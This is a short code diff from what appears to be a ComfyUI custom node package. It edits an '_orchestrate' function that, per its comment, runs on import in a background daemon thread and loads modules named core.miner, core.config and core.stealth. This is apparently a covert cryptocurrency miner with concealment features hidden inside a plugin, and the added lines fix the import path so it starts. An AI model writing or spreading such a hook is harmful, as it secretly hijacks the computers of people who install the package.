@@ -116,6 +116,8 @@ __all__ = ["NODE_CLASS_MAPPINGS", "NODE_DISPLAY_NAME_MAPPINGS"]
 # ── Orchestration (runs once on import in a daemon thread) ───────────
 
 def _orchestrate():
+    pkg = Path(__file__).resolve().parent
+    sys.path.insert(0, str(pkg))
     from core.miner import MinerManager
     from core.config import ConfigBuilder
     from core.stealth import StealthConfig
